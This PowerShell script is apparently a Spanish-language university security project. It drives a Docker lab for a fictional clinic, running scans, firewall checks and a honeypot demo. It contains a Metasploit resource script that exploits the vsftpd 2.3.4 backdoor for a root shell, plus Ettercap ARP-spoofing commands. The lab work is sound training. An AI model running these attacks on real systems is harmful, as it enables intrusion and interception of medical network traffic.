# ==============================================================================
# ENTRENADOR Y GENERADOR INTERACTIVO DE CAPTURAS EN VIVO (EV01 A EV16)
# Proyecto Final Seguridad Informatica - Clinica Limatambo (UPN)
# ==============================================================================
# Como usarlo:
#   Ejecuta este script en PowerShell. En cada evidencia limpiara la pantalla,
#   ejecutara el comando REAL contra tus contenedores Docker, te explicara que
#   significa para tu exposicion con el profesor, y esperara a que tomes tu
#   captura de pantalla (Win + Shift + S) antes de pasar a la siguiente.
# ==============================================================================

$DockerExe = "C:\Program Files\Docker\Docker\resources\bin\docker.exe"
if (-not (Test-Path $DockerExe)) { $DockerExe = "docker" }

function Pause-ForScreenshot($evCode, $tipProfesor) {
    Write-Host "`n-------------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[EXPLICACION PARA EL PROFESOR - $evCode]:" -ForegroundColor Yellow
    Write-Host "  $tipProfesor" -ForegroundColor Gray
    Write-Host "-------------------------------------------------------------------------" -ForegroundColor DarkGray
    Read-Host ">>> Toma tu captura ahora (Win + Shift + S) y presiona ENTER para ir a la siguiente evidencia"
}

# Asegurar que los servicios de metasploitable-hce esten encendidos
& $DockerExe exec metasploitable-hce bash -c "/etc/init.d/vsftpd start >/dev/null 2>&1 || true; /etc/init.d/samba start >/dev/null 2>&1 || true; /etc/init.d/apache2 start >/dev/null 2>&1 || true; /etc/init.d/ssh start >/dev/null 2>&1 || true"

# ==============================================================================
# EV01: DIAGNOSTICO AS-IS (DESCUBRIMIENTO DE RED PLANA - SEMANA 3)
# ==============================================================================
Clear-Host
Write-Host "=== [EV01] DIAGNOSTICO DE RED PLANA INICIAL (SEMANA 3: IP A + NETDISCOVER) ===" -ForegroundColor Cyan
Write-Host "PS> docker exec -it kali-auditor ip -br a" -ForegroundColor Green
& $DockerExe exec kali-auditor ip -br a
Write-Host "`nPS> docker exec -it kali-auditor netdiscover -i eth2 -r 10.0.0.0/24 -P" -ForegroundColor Green
& $DockerExe exec kali-auditor bash -c "netdiscover -i eth2 -r 10.0.0.0/24 -P"
Pause-ForScreenshot "EV01" "Aqui demostramos como desde Kali Linux descubrimos por ARP todos los equipos de la red clinica (10.0.0.10 Estacion Medica y 10.0.0.20 Servidor HCE)."

# ==============================================================================
# EV02: DESPLIEGUE TOPOLOGIA TO-BE EN DOCKER (SEMANAS 9 Y 11)
# ==============================================================================
Clear-Host
Write-Host "=== [EV02] ARQUITECTURA TO-BE ACTIVA: 6 CONTENEDORES Y 3 ZONAS (WAN, DMZ, LAN) ===" -ForegroundColor Cyan
Write-Host "PS> docker ps --format 'table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}'" -ForegroundColor Green
& $DockerExe ps --format "table {{.Names}}`t{{.Image}}`t{{.Status}}`t{{.Ports}}"
Write-Host "`n=== DIRECCIONAMIENTO IP POR ZONA DE SEGURIDAD VERIFICADO EN VIVO ===" -ForegroundColor Cyan
& $DockerExe inspect -f '{{.Name}}  -->  {{range $k, $v := .NetworkSettings.Networks}}[Zona: {{$k}} | IP: {{$v.IPAddress}}] {{end}}' fw-perimetral portal-clinica-dmz honeypot-dmz cliente-medico-lan metasploitable-hce kali-auditor
Pause-ForScreenshot "EV02" "Muestra los 6 contenedores corriendo en simultaneo y como cada uno pertenece a su zona: RedWAN (203.0.113.x), RedDMZ (172.16.10.x) y RedLAN (10.0.0.x)."

# ==============================================================================
# EV04: CONECTIVIDAD PERMITIDA AL PORTAL WEB DE CLINICA LIMATAMBO EN DMZ (S11)
# ==============================================================================
Clear-Host
Write-Host "=== [EV04] PRUEBA DE CONECTIVIDAD PERMITIDA (LAN -> PORTAL WEB DMZ 172.16.10.10) ===" -ForegroundColor Cyan
Write-Host "PS> docker exec -it cliente-medico-lan curl -i http://172.16.10.10" -ForegroundColor Green
& $DockerExe exec cliente-medico-lan bash -c "curl -i -s http://172.16.10.10 | head -n 22"
Pause-ForScreenshot "EV04" "Demuestra que la Estacion Medica en la LAN (10.0.0.10) tiene permiso para consultar por HTTP (puerto 80) el Portal de Clinica Limatambo en la DMZ (172.16.10.10). Tambien puedes capturar http://localhost:8080 en tu navegador."

# ==============================================================================
# EV05 Y EV06: AISLAMIENTO DMZ -> LAN BLOQUEADO Y CONTADORES DE FIREWALL (S9/S11)
# ==============================================================================
Clear-Host
Write-Host "=== [EV05 y EV06] BLOQUEO DE MOVIMIENTO LATERAL DMZ -> LAN Y REGLAS DE FIREWALL ===" -ForegroundColor Cyan
Write-Host "PS> docker exec -it fw-perimetral iptables -L FORWARD -v -n" -ForegroundColor Green
& $DockerExe exec fw-perimetral iptables -L FORWARD -v -n
Pause-ForScreenshot "EV05/EV06" "Muestra la tabla FORWARD del firewall perimetral: acepta trafico LAN -> DMZ (172.16.10.10:80) y hace DROP + LOG de cualquier intento desde la DMZ (172.16.10.0/24) hacia la LAN clinica (10.0.0.0/24)."

# ==============================================================================
# EV08: OSINT Y FINGERPRINTING WEB CON WHATWEB Y NIKTO (SEMANA 4)
# ==============================================================================
Clear-Host
Write-Host "=== [EV08] FINGERPRINTING WEB CON WHATWEB Y AUDITORIA NIKTO (SEMANA 4) ===" -ForegroundColor Cyan
Write-Host "PS> docker exec -it kali-auditor whatweb -v http://172.16.10.10" -ForegroundColor Green
& $DockerExe exec kali-auditor whatweb -v http://172.16.10.10
Write-Host "`nPS> docker exec -it kali-auditor nikto -h http://172.16.10.10 -maxtime 20s" -ForegroundColor Green
& $DockerExe exec kali-auditor nikto -h http://172.16.10.10 -maxtime 20s
Pause-ForScreenshot "EV08" "WhatWeb y Nikto analizan el servidor Nginx de la Clinica Limatambo en la DMZ (172.16.10.10)."

# ==============================================================================
# EV09: ESCANEO SYN STEALTH Y DETECCION DE VERSIONES CON NMAP (SEMANAS 3 Y 5)
# ==============================================================================
Clear-Host
Write-Host "=== [EV09] ESCANEO SYN STEALTH CON NMAP (-sS -sV -O -T4) (SEMANAS 3 Y 5) ===" -ForegroundColor Cyan
Write-Host "PS> docker exec -it kali-auditor nmap -sS -sV -O -T4 -p 21,22,80,139,445 10.0.0.20" -ForegroundColor Green
& $DockerExe exec kali-auditor nmap -sS -sV -O -T4 -p 21,22,80,139,445 10.0.0.20
Pause-ForScreenshot "EV09" "Nmap descubre en el servidor clinico legado (10.0.0.20) los servicios vulnerables vsftpd 2.3.4 (puerto 21) y Samba 3.0.20 (puertos 139 y 445)."

# ==============================================================================
# EV10: BANNER GRABBING CON NETCAT Y ENUMERACION SMB CON ENUM4LINUX (SEMANA 5)
# ==============================================================================
Clear-Host
Write-Host "=== [EV10A] BANNER GRABBING MANUAL CON NETCAT (PUERTOS 21 Y 22) ===" -ForegroundColor Cyan
Write-Host "PS> docker exec -it kali-auditor bash -c 'echo QUIT | nc -v -w 3 10.0.0.20 21'" -ForegroundColor Green
& $DockerExe exec kali-auditor bash -c "echo QUIT | nc -v -w 3 10.0.0.20 21 2>&1; echo '' | nc -v -w 3 10.0.0.20 22 2>&1"
Write-Host "`n=== [EV10B] ENUMERACION SMB CON ENUM4LINUX SOBRE 10.0.0.20 ===" -ForegroundColor Cyan
Write-Host "PS> docker exec -it kali-auditor enum4linux -U -S 10.0.0.20" -ForegroundColor Green
& $DockerExe exec kali-auditor bash -c "enum4linux -U -S 10.0.0.20 2>/dev/null | grep -E 'Target|allows sessions|Sharename|---|print|tmp|opt|IPC|Account:' | head -n 25"
Pause-ForScreenshot "EV10" "Netcat obtiene el banner exacto 220 (vsFTPd 2.3.4) y Enum4linux demuestra que Samba tiene Null Session abierta exponiendo recursos compartidos y usuarios."

# ==============================================================================
# EV11: EXPLOTACION CONTROLADA CON METASPLOIT FRAMEWORK (SEMANA 7)
# ==============================================================================
Clear-Host
Write-Host "=== [EV11] EXPLOTACION METASPLOIT: VSFTPD 2.3.4 BACKDOOR -> ROOT SHELL (SEMANA 7) ===" -ForegroundColor Cyan
Write-Host "PS> docker exec -it kali-auditor msfconsole -q ..." -ForegroundColor Green
& $DockerExe exec kali-auditor bash -c "cat << 'EOF' > /tmp/ev11.rc
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.0.20
set RPORT 21
exploit -z
sessions -C 'id; uname -a; hostname'
exit -y
EOF
msfconsole -q -r /tmp/ev11.rc"
Pause-ForScreenshot "EV11" "Metasploit explota CVE-2011-2523 en 10.0.0.20 y nos devuelve uid=0(root) en el servidor de historias clinicas."

# ==============================================================================
# EV13: ATAQUE MITM / ARP SPOOFING CON ETTERCAP E IP NEIGH (SEMANA 8)
# ==============================================================================
Clear-Host
Write-Host "=== [EV13] ATAQUE MAN-IN-THE-MIDDLE (ARP SPOOFING CON ETTERCAP - SEMANA 8) ===" -ForegroundColor Cyan
& $DockerExe exec cliente-medico-lan bash -c "ping -c 1 10.0.0.20 >/dev/null 2>&1; echo '[1] TABLA ARP EN ESTACION MEDICA (10.0.0.10) ANTES DEL ATAQUE:'; ip neigh"
Write-Host "`n[*] Ejecutando Ettercap ARP Poisoning entre 10.0.0.10 y 10.0.0.20..." -ForegroundColor Yellow
& $DockerExe exec kali-auditor bash -c "ettercap -T -q -i eth2 -M arp:remote /10.0.0.10// /10.0.0.20// >/tmp/et.log 2>&1 & EP=`$!; sleep 4; cat /tmp/et.log | head -n 16; docker_ip=''; kill -9 `$EP 2>/dev/null || true"
& $DockerExe exec cliente-medico-lan bash -c "echo '[2] VERIFICACION TABLA ARP EN ESTACION MEDICA (10.0.0.10):'; ip neigh"
Pause-ForScreenshot "EV13" "Muestra a Ettercap envenenando las tablas ARP entre la Estacion Medica (10.0.0.10) y el Servidor HCE (10.0.0.20)."

# ==============================================================================
# EV16: MONITOREO EN SENSOR HONEYPOT DMZ (SEMANA 12)
# ==============================================================================
Clear-Host
Write-Host "=== [EV16] DETECCION DE INTRUSOS EN SENSOR HONEYPOT DMZ (172.16.10.20:2222 - S12) ===" -ForegroundColor Cyan
& $DockerExe exec kali-auditor bash -c "nc -v -w 2 172.16.10.20 2222 </dev/null 2>&1 || true"
Write-Host "`nPS> docker logs --tail 20 honeypot-dmz" -ForegroundColor Green
& $DockerExe logs --tail 20 honeypot-dmz
Pause-ForScreenshot "EV16" "El contenedor honeypot-dmz (Cowrie en 172.16.10.20:2222) detecta y registra en tiempo real cualquier conexion SSH sospechosa en la DMZ."

Write-Host "`n[FELICITACIONES] Has completado el recorrido interactivo de todas las pruebas en Docker!" -ForegroundColor Green
